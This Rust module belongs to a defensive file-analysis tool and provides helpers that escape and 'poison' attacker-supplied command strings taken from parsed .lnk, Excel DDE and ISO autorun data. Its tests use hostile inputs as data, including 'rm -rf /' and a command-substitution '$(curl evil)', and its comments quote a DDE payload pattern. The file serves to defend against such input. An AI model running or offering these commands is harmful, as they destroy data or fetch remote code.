//! Shell-quote boundaries for attacker-supplied strings.
//!
//! Several Wave 2 parsers carry strings that *describe* a command
//! the attacker wrote but **must not be executed**:
//!
//!   * `doc_payload::lnk::LnkInfo.command_arguments` — from a
//!     `.lnk` `StringData::Arguments` block
//!   * `office::excel::XlFormulaFinding.snippet` — cell formula
//!     text containing `cmd|'/c …'!A0` DDE payloads
//!   * `payload_anomaly::iso_autorun::AutorunFinding.referenced_payload`
//!     — from `[autorun] open=` directive value
//!
//! Whenever these reach a log line, a tooltip, or a JSON payload
//! sent to an external system, they should pass through one of
//! the quoting helpers here. The helpers do *not* assume any
//! particular shell — they emit a debug-quoted form that is
//! always safe to display and never reinterpreted by the
//! receiver.

/// Render `s` as a log-safe quoted string. Control characters
/// (NUL, ESC, backspace, …) are replaced by their `\xNN`
/// escape; backslashes and double-quotes are escaped; the
/// result is wrapped in double quotes.
///
/// The output is **not** suitable as a real shell argument —
/// quoting rules differ per shell (POSIX `sh`, `bash`,
/// PowerShell, `cmd.exe`) and we don't want any consumer
/// accidentally splicing this into a command line. Use this
/// for display / logging only.
pub fn quote_for_log(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for c in s.chars() {
        match c {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if (c as u32) < 0x20 => {
                use std::fmt::Write;
                let _ = write!(out, "\\x{:02X}", c as u32);
            }
            c => out.push(c),
        }
    }
    out.push('"');
    out
}

/// Wrap `s` so that any future code mistakenly trying to use it
/// as a command-line fragment fails loudly rather than silently
/// invoking the attacker's payload. Always prepends a banner
/// that no real shell will accept. Use this when the value
/// **must not** reach a shell — making misuse syntactically
/// invalid is a defense-in-depth layer above the typed-API
/// boundary.
pub fn poisoned_for_exec(s: &str) -> String {
    format!("# MYTHODIKAL_REFUSED_TO_EXEC {}", quote_for_log(s))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn quote_for_log_escapes_double_quote_and_backslash() {
        assert_eq!(quote_for_log("hello"), "\"hello\"");
        assert_eq!(quote_for_log("a\"b"), "\"a\\\"b\"");
        assert_eq!(quote_for_log("a\\b"), "\"a\\\\b\"");
    }

    #[test]
    fn quote_for_log_escapes_control_chars() {
        assert_eq!(quote_for_log("a\nb"), "\"a\\nb\"");
        assert_eq!(quote_for_log("a\rb"), "\"a\\rb\"");
        assert_eq!(quote_for_log("a\tb"), "\"a\\tb\"");
        assert_eq!(quote_for_log("a\x00b"), "\"a\\x00b\"");
        assert_eq!(quote_for_log("a\x1Bb"), "\"a\\x1Bb\"");
    }

    #[test]
    fn quote_for_log_preserves_unicode() {
        // Multi-byte chars (above 0x7F) survive untouched.
        assert_eq!(quote_for_log("café"), "\"café\"");
        assert_eq!(quote_for_log("💀"), "\"💀\"");
    }

    #[test]
    fn quote_for_log_empty_input() {
        assert_eq!(quote_for_log(""), "\"\"");
    }

    #[test]
    fn poisoned_for_exec_starts_with_refuse_banner() {
        let out = poisoned_for_exec("calc.exe");
        assert!(out.starts_with("# MYTHODIKAL_REFUSED_TO_EXEC"));
        assert!(out.contains("\"calc.exe\""));
    }

    #[test]
    fn poisoned_for_exec_neutralises_injection_attempt() {
        // Even with shell metacharacters, the output is comment-
        // -prefixed and quoted; no sh/bash/cmd would execute it.
        let out = poisoned_for_exec("; rm -rf / ; #");
        assert!(out.starts_with("# MYTHODIKAL_REFUSED_TO_EXEC"));
        // Control chars + metachars get quoted.
        let nasty = poisoned_for_exec("$(curl evil)\n`rm -rf /`");
        assert!(nasty.contains("\\n"));
    }
}
